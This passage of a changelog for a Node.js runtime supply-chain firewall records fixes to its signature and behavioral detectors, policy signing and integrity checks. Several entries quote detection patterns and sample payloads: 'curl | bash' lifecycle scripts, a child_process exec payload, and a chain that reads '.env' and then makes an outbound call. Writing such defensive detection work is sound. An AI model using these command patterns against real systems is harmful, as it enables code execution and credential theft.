- **F-28 (behavioral false positive) — Comments were treated as filesystem access**: `BehaviorTracker.analyzeModule()`'s `scanSrc` normalization stripped require/import specifiers and URLs but not comments, so a path-shaped string mentioned only in prose (e.g. `// src/auth/credentials.ts`) matched `SENSITIVE_PATH` and, next to any real `networkEgress` call elsewhere in the module, false-positived `CREDENTIAL_EXFILTRATION`. Block comments (`/* ... */`) and line comments (`//...`) are now stripped at the head of the `scanSrc` chain, before the specifier-blanking passes. The line-comment strip uses a negative lookbehind on `:` so the `//` in `https://` is never mistaken for a comment start — code following a same-line URL (e.g. `const u='https://x.com'; https.get(u)`) still survives for detection. Verified against the adversarial suite (17/17), a soak run (0% FP / 100% TP, `results/soak-2026-07-15.jsonl`), the new false-positive case (comment + `fetch()` → clean), and the F-27b regression guard (chained `require('fs').readFileSync('.env')` + `https.get()` → still BLOCKED).

- **F-27 (research tooling) — `monitor.js` called a nonexistent detector method**: The standalone research monitor's `scanFile()` called `detector.scan(filePath, content)` and read `result.blocked`/`result.reason`, neither of which exist on `Detector` — only `scanModuleSync(packageName, moduleContent, filename)` returning `{ action, detections }` does. Because the call was wrapped in a `try/catch` spanning the whole function, the resulting `TypeError` was silently swallowed on every file, so the monitor ran but logged nothing. `scanFile()` now calls `detector.scanModuleSync(filePath, content, filePath)`, filters `detections` down to `CRITICAL`/`HIGH` severity, and dedupes repeat `fs.watch` events per file+threat-type so a single edit doesn't produce duplicate log lines.

### Added

- **`docs/MONITOR.md`**: Full run manual for the research monitor — usage, log format, deduplication behavior, and troubleshooting. Linked from the root README's new "Research Monitor" section.

## [0.3.0] - 2026-07-13

### Fixed

- **F-23 (CRITICAL) — Self-integrity check is now cross-platform**: `computeSelfHash()` hashed raw file bytes, so a checkout with CRLF line endings (Windows, or a CI runner with `core.autocrlf=true`) produced a different hash than the committed `.helios-baseline` and the agent refused to start — a release blocker on Linux/CI/Mac mixed environments. The hash now reads each self-file as UTF-8 and normalizes `\r\n` → `\n` before updating the digest, so line-ending differences no longer break integrity verification. A repo-root `.gitattributes` enforces LF for text files (and `-text` for `.pem`) to keep working trees consistent, and `.helios-baseline` was regenerated against the normalized content.

- **F-24 (LOW) — Blocked modules no longer poison cross-module state**: `BehaviorTracker.analyzeModule()` updated the cross-module `globalState` (sensitiveRead/networkEgress/etc.) even for modules that were themselves blocked by a CRITICAL/HIGH violation. A blocked module never executes, so its signals must not raise suspicion on later, unrelated modules (e.g. a blocked credential stealer wrongly triggering `CROSS_MODULE_EXFILTRATION` on the next module's ordinary network call). The `globalState` updates are now skipped when the module's own violations include a CRITICAL/HIGH block.

### Added

- **`demo/` walkthrough**: A self-contained demonstration (`bash demo/demo.sh`) that loads a crypto-miner and a credential stealer (both BLOCKED) alongside a benign analytics module (ALLOWED), doubling as an end-to-end smoke test.

- **Dependabot**: Weekly npm dependency updates configured for `/`, `/packages/fw-agent`, and `/packages/fw-control` via `.github/dependabot.yml`.

## [0.2.2] - 2026-07-03

### Fixed

- **F-02a (HIGH) — Dev-key policy verification refused in production**: `PolicyWatcher` fell back to the bundled Ed25519 dev key when `FW_POLICY_PUBKEY` was not set. The dev private key (`scripts/dev-private-key.pem`) is committed to the public repository, so any attacker could forge a valid policy signature and a forgetful production deploy would trust it — defeating the F-02 fix entirely. `start()` now refuses to load a policy file using the dev key unless `FW_ALLOW_DEV_POLICY_KEY=1` is explicitly set. Operators must either supply `FW_POLICY_PUBKEY` (their own production key) or set `FW_ALLOW_DEV_POLICY_KEY=1` to acknowledge the dev-key risk in local/dev/CI environments. Agents with no `policy.signed.json` on disk are unaffected — the guard only fires when a policy file is actually present.

## [0.2.1] - 2026-07-02

### Fixed

- **F-09 (MEDIUM) — Dashboard always authenticated**: `fw-control` previously left `/logs` open when `HELIOS_DASHBOARD_TOKEN` was not set (warning only). Now, if no token is provided, a cryptographically strong 32-byte random token is auto-generated at startup and printed once to stdout. The endpoint is therefore always protected — operators who want a stable token set `HELIOS_DASHBOARD_TOKEN` in their environment; those who do not still get auth, just ephemeral.

- **F-10 (LOW) — Self-integrity baseline is no longer trust-on-first-use**: `verifySelfIntegrity()` previously created `.helios-baseline` from the current disk state on first run if the file was absent. An attacker who tampered with the agent code and deleted the baseline file would get a freshly trusted hash. The `else` branch is replaced with a hard `process.exit(1)`: a missing baseline is treated the same as a failed hash comparison. The baseline is committed to the repository and shipped in the npm package, so it will always be present for legitimate installs.

- **F-11 (LOW) — Prototype freeze is now opt-in**: `primitiveLockdown()` previously froze `Object/Array/Function/Promise/RegExp` prototypes unconditionally on agent load. This breaks legitimate libraries (polyfills, some ORMs, test frameworks) silently. The lock is now gated on `FW_FREEZE_PROTOTYPES=1`. Default is off; operators who want the hardening set the flag explicitly.

- **F-12 (LOW) — Compile cache keyed on content hash**: `verifiedCompilationsCache` was a `Set` of filenames. A file rewritten on disk and re-required in a long-lived process (e.g. after `delete require.cache[f]`) would not be re-scanned. Changed to a `Map<filename, sha256>`: the cache only bypasses the scan when both the filename and the SHA-256 of the current content match the previously scanned version.

## [0.2.0] - 2026-07-02

### Fixed

- **F-03 (HIGH) — Full-content scanning**: The signature scanner previously truncated all modules to the first 2 KB before running Aho-Corasick, allowing malicious code to hide after an innocent-looking header. The truncation is removed; all module content is now scanned. Aho-Corasick is O(N) so this costs nothing asymptotically. Added adversarial regression test case 15 (3 KB benign padding + `stratum` URL at end → BLOCKED).

- **F-02 (HIGH) — Asymmetric policy signing replaces TOFU hash baseline**: `PolicyWatcher` no longer stores a SHA-256 hash in a sidecar `.baseline` file. Instead, `policy.signed.json` must carry a valid Ed25519 signature over its canonical payload `{ version, rules (sorted), signedAt }`. An invalid or missing signature triggers immediate lockdown — fail-closed with no backward-compatibility grace period. The public key is compiled into `src/policy-watcher.js` and is therefore part of the self-integrity hash. Operators can override it via `FW_POLICY_PUBKEY` (PEM). Utility scripts: `scripts/generate-policy-key.js`, `scripts/sign-policy.js`.

- **F-06 (MEDIUM) — Policy hot-reload without restart**: `PolicyWatcher` now delivers rules to `index.js` via an `onValidChange(rules)` callback on startup and on every verified policy update. When the periodic check detects a valid new signature with different rules, `policyMap` is rebuilt in place without restarting the process. Invalid signatures still trigger lockdown.

- **F-07 (MEDIUM) — Behavioral analysis no longer skips small modules**: `BehaviorTracker.analyzeModule()` had a `content.length < 100` guard that silently dropped all analysis for tiny modules. Removed. Added adversarial regression test case 16 (48-byte credential-exfiltration module → BLOCKED via behavioral detection).

- **F-08 (MEDIUM) — NETWORK_EGRESS regex extended**: Inline `require("https").get(...)` and `require("http").request(...)` patterns were not matched by the behavioral `NETWORK_EGRESS` regexes (which looked for `https.get(` as a bare identifier). Added: `/require\s*\(\s*['"]https?['"]\s*\)\s*\.\s*(?:get|request)\s*\(/`.

- **F-09 (MEDIUM) — Control plane binds to 127.0.0.1 by default**: `fw-control` previously listened on `0.0.0.0`, exposing the telemetry and dashboard endpoints on all network interfaces. Default host is now `127.0.0.1`. Production deployments that need external access should place a TLS-terminating reverse proxy in front.

- **F-13 (LOW) — Control plane warns when dashboard is unauthenticated**: If `HELIOS_DASHBOARD_TOKEN` is not set, `fw-control` now logs a startup warning rather than silently accepting all requests to `/logs`.

### Added

- `scripts/generate-policy-key.js`: generates a new Ed25519 key pair and prints instructions for embedding the public key and signing policies.
- `scripts/sign-policy.js`: signs a rules JSON file with a private key and writes a `policy.signed.json` ready for deployment. Also exports `{ signPolicy }` for programmatic use in tests.
- `scripts/dev-private-key.pem`: **development/CI private key — DO NOT use in production.** The corresponding public key is compiled into `src/policy-watcher.js`. Generate your own key pair before deploying.
- `packages/fw-agent/policy.signed.json`: example policy file signed with the dev key (empty rules — add your own BLOCK/QUARANTINE/OBSERVE entries and re-sign).

### Changed

- `PolicyWatcher` constructor API: second argument is now `{ onTamperDetected, onValidChange }` (callbacks object) instead of a bare function. `options.intervalMs` is unchanged.
- `detector.stats`: `chunkBypasses` counter removed (truncation is gone); `warnOnlyDetections` counter added for WARN-tier signature matches.
- `index.js` module-load hook: WARN-only detections (`warnOnly: true`) now emit `OBSERVE` telemetry and never escalate to `QUARANTINE`. Only `HIGH`/`CRITICAL`/`MEDIUM` block-tier detections affect module execution.

## [0.1.1] - 2026-07-02

### Fixed

- **F-01 (CRITICAL) — CI pipeline**: Unit and adversarial test steps were executing `npm test` inside `packages/fw-agent/`, which has no `scripts.test`. All test scripts now run from the monorepo root using `npm run test:unit` and `npm run test:adversarial` against the correct root `package.json`.

- **F-05 (MEDIUM) — Quarantine no longer kills the host process**: `QuarantineStub.record()` contained a `process.exit(9)` that fired when more than 100 intercepts occurred within 1 ms ("Wilsonian Regulator"). Killing the host application on a potential exhaustion probe defeats the point of a graceful quarantine. Replaced with a rate-limited `console.warn` (logs once per 10 occurrences) and an early `return` so the proxy remains inert without crashing the service.

- **F-04 (HIGH) — Reduced false positives via signature tiering**: The single `SIGNATURES` array (26 patterns, one AhoCorasick instance) is replaced with two tiers:
  - **`BLOCK_SIGNATURES`** (19 patterns, unchanged blocking behaviour): crypto-miner pool identifiers, `eval(`, `new function`, `child_process.*`, `execsync`, `spawnsync`, `curl` (with trailing space), `wget` (with trailing space), pastebin URLs.
  - **`WARN_SIGNATURES`** (7 patterns, `OBSERVE`-only, never block): `buffer.from`, `atob(`, `btoa(`, `https.request`, `http.request`, `net.createconnection`, `socket.connect`.
  WARN-tier matches produce a `{ severity: 'WARN', warnOnly: true }` detection entry and are counted in `stats.warnOnlyDetections` but never escalate to `QUARANTINE`.

### Added

- **F-14 — Basic test coverage** for previously untested components:
  - `packages/fw-agent/test/quarantine-unit-test.js`: proxy inertness, rate-limit behaviour, no `process.exit`.
  - `packages/fw-agent/test/policy-watcher-unit-test.js`: `verify()` pass/fail, lockdown callback, timer interval configurable via constructor `options.intervalMs`.
  - `packages/fw-agent/test/audit-log-unit-test.js`: file write, multi-line output, stderr fallback.
  - `packages/fw-control/test/control-plane-auth-test.js`: `/logs` 401 without token, 200 with correct token, 401 with wrong token, `/v1/health` unauthenticated.

## [0.1.0] - 2026-06-20

### Added

- **Behavioral detection pass (`FW_ENABLE_BEHAVIORAL`)**: default on (`1`); set to `0` to disable the behavioral pass and retain signature scanning only. Behavioral analysis tracks dangerous action sequences across and within modules using a state machine (see README for the five rules). Adversarial suite results: 14/14 test cases pass with behavioral on, 12/14 with behavioral off (tests 6 and 7 assert a behavioral event type in the detection record; both modules are still blocked by signature scanning when behavioral is disabled). Set `FW_ENABLE_BEHAVIORAL=0` for signature-only mode in environments where behavioral false-positive rate is unacceptable.

- **Behavioral scope reset at dependency-tree root**: the cross-module behavioral state machine resets when a new dependency-tree root is compiled (`this.parent === null`). This prevents a benign module that reads a credential file in one dependency tree from poisoning the global state and triggering a false positive when an unrelated tree later makes a network call.

- **Self-integrity check at startup**: on every startup the firewall computes a SHA-256 hash over the concatenated bytes of all seven engine files in a fixed order (`index.js`, `src/detector.js`, `src/behavior-tracker.js`, `src/policy-watcher.js`, `src/quarantine.js`, `src/audit-log.js`, `src/policy.js`) and compares it to `.helios-baseline`. If the firewall code has been tampered with, startup is aborted with exit code 1. On first run with no baseline file, the baseline is written automatically.

- **Policy integrity verification (SHA-256 file-hash tamper detection via PolicyWatcher)**: `policy.signed.json` rules are loaded on startup. The `PolicyWatcher` computes the file's SHA-256 hash at load time and re-verifies it every 60 seconds. If the file is modified or replaced at runtime, an emergency lockdown is activated that causes all subsequent module loads to throw immediately. Note: the `.signed` convention in the filename means the file is integrity-monitored at runtime via SHA-256 file hashing — this is NOT asymmetric/cryptographic signing.

- **npm lifecycle script scanning**: on startup, `package.json` scripts are scanned for supply-chain attack patterns (`curl | bash`, `wget | sh`, `bash -c '...'`, `eval $`, `base64 --decode`, etc.). Matches are blocked before any application code runs. Set `HELIOS_BLOCK_SCRIPTS=0` to downgrade from block to warn.

- **Telemetry worker thread (fail-open)**: `FW_TELEMETRY=1` starts a worker thread that batches detection events and POSTs them to `http://localhost:$FW_CONTROL_PORT/v1/telemetry` (default port 3000). With no control plane running the worker swallows connection errors silently and delivers nothing -- fail-open is intentional so the host application is never blocked by a missing control plane. No control plane ships in this package; see `packages/fw-control` in the monorepo for the optional server.

- **Zero runtime dependencies**: `aletheia-firewall` has no `dependencies` or `optionalDependencies`. All capabilities use Node.js built-in modules only (`fs`, `crypto`, `module`, `worker_threads`, `http`, `path`, `os`).

- **Aho-Corasick signature scanner**: O(N) multi-pattern matching over the first 2 KB of each module source, with 27 signatures covering crypto-miners, dynamic code execution, process/shell execution, outbound network egress, supply-chain worm indicators, and native binding/VM escape vectors.

- **Quarantine mode**: modules matching a `QUARANTINE` policy rule or triggering a `MEDIUM`-severity behavioral detection have their exports replaced with a logging `Proxy` that intercepts all property access and method calls without executing the module's code. Child `require()` calls from a quarantined module are also blocked.

- **Persistent append-only audit log**: every security event is written as a JSON line to `HELIOS_LOG_DIR` (default `/var/log/helios/audit.log`, falling back to `$TMPDIR/helios/audit.log`). Log files rotate at 10 MB, keeping 5 generations.

- **Graceful shutdown**: `SIGTERM` and `SIGINT` flush pending telemetry, terminate the worker thread, flush the audit log, and exit cleanly.

### Fixed

- **F-01 (HIGH) — sub-512B module scan-skip removed**: `src/detector.js` previously returned `OBSERVE` immediately for any module under 512 bytes, bypassing both signature and behavioral analysis entirely. A 487-byte `eval(require("child_process").exec("id"))` payload produced zero detections. The unconditional size pre-filter has been removed; all non-empty string content is now scanned. Gate overhead rose from ~17-20% to ~21% on EPYC hardware; the 25% budget is not breached.

- **F-02 (MEDIUM) — `src/policy.js` added to the 7-file self-integrity hash**: `policy.js` ships in the tarball and is `require()`d at runtime by the hashed engine file `quarantine.js`. It was excluded from the 6-file SHA-256 hash, so post-install tampering of `policy.js` was undetected. Now hashed as the 7th engine file. `.helios-baseline` regenerated to `935dfdc24026b0be17b6a42188f449f59fecb86ccd568ceb0eac588bc921232f`.

- **F-03 (MEDIUM) — adversarial test-harness state contamination fixed**: the shared `Detector` instance caused `BehaviorTracker.globalState` to accumulate across test cases; test 12 was firing `CROSS_MODULE_CODE_EXEC` via state leaked from test 7, not standalone detection. Added `detector.behaviorTracker.reset()` in the `test()` helper so each case starts clean. Two F-01 regression fixtures added as tests 13 and 14.

### Performance

Measured on a 900-module cold load (methodology: `run-gate-test.js`, median-of-5 cold-process A/B, 10-iteration warmup excluded), Node v22 (CI: 18, 20, 22), Linux x64:

| Host | Median overhead | Gate budget | P95 overhead | Enforced? |
| ---- | --------------- | ----------- | ------------ | --------- |
| AMD EPYC 9V74 (80-core) | ~20% | 25% | ~25-27% | Median only |
| AMD EPYC 7763 (64-core) | ~17% | 25% | ~31-37% | Median only |

Post-v0.1.0-prerelease-fix (sub-512B scan-skip removed): median rose to ~21% on EPYC hardware — still within the 25% budget. See `results/gate-post-f01.txt` for the committed benchmark run.

Source files: `results/bench-n10-run-*.txt` (EPYC 9V74), `results/gate-3x-epyc-20260618.txt` (EPYC 7763), `results/gate-post-f01.txt` (post-F-01 fix).

The gate enforces the **median only** at a 25% budget. P95 is reported for operational transparency but is not a fail condition; it reflects shared-CPU scheduler contention on multi-tenant hardware, not firewall algorithmic cost, and is not stable across hosts.

[unreleased]: https://github.com/holeyfield33-art/runtime-firewall-mvp/compare/v0.6.0...HEAD
[0.6.0]: https://github.com/holeyfield33-art/runtime-firewall-mvp/compare/v0.5.0...v0.6.0
[0.5.0]: https://github.com/holeyfield33-art/runtime-firewall-mvp/compare/v0.4.0...v0.5.0
[0.4.0]: https://github.com/holeyfield33-art/runtime-firewall-mvp/compare/v0.3.0...v0.4.0
[0.2.0]: https://github.com/holeyfield33-art/runtime-firewall-mvp/compare/v0.1.1...v0.2.0
[0.1.1]: https://github.com/holeyfield33-art/runtime-firewall-mvp/compare/v0.1.0...v0.1.1
[0.1.0]: https://github.com/holeyfield33-art/runtime-firewall-mvp/releases/tag/v0.1.0
